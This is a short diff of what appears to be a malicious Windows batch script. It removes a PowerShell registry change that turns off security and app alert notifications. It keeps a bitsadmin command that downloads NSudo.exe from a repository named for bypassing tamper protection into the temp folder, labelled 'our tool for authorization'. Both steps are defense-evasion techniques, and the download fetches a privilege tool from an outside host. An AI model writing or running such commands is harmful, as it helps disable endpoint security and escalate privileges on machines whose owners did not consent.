@@ -1,8 +1,3 @@
- 
-
-REM- Turning off security and app alerts
-powershell.exe New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\PushNotifications -Name ToastEnabled  -PropertyType DWord -Value 0 -Force
-
 REM- our tool for authorization
 bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
 
